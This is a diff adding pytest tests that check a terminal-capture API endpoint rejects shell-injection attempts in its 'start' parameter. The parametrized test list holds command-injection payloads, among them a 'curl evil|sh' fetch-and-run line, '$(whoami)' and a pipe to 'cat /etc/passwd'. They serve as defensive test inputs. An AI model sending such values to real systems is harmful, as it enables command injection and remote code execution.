@@ -330,3 +330,38 @@ def test_non_thread_non_keeper_session_still_does_not_mint(term_client):
     resp = _send(term_client, session="dev", text="dev tooling chatter", enter=True)
     assert resp.get_json()["journaled"] is False
     assert term_client._stream.calls == []
+
+
+# --- capture start-offset is shell-injection-guarded (added 2026-07-24) -----
+# /api/terminal/capture's `start` query param is interpolated into a shell=True
+# tmux command. It must be allowlisted to an optional-minus integer, exactly
+# like the `key` param in terminal_send, or it's a command-injection vector.
+
+def test_capture_valid_start_reaches_tmux(term_client):
+    resp = term_client.get("/api/terminal/capture?start=-200")
+    assert resp.status_code == 200
+    assert any("capture-pane" in c and "-S -200" in c for c in term_client._tmux_calls)
+
+
+def test_capture_default_start_when_omitted(term_client):
+    resp = term_client.get("/api/terminal/capture")
+    assert resp.status_code == 200
+    assert any("-S -5000" in c for c in term_client._tmux_calls)
+
+
+@pytest.mark.parametrize("evil", [
+    "-5000;touch /tmp/pwned",
+    "-5000 && curl evil|sh",
+    "$(whoami)",
+    "`id`",
+    "-5000|cat /etc/passwd",
+    "abc",
+    "",
+    "-99999999",   # too many digits for the {1,7} bound
+])
+def test_capture_rejects_injection_and_never_shells_out(term_client, evil):
+    resp = term_client.get("/api/terminal/capture", query_string={"start": evil})
+    assert resp.status_code == 400
+    assert resp.get_json()["error"] == "invalid start"
+    # the guard must fire BEFORE _tmux — no capture-pane command was ever built
+    assert not any("capture-pane" in c for c in term_client._tmux_calls)
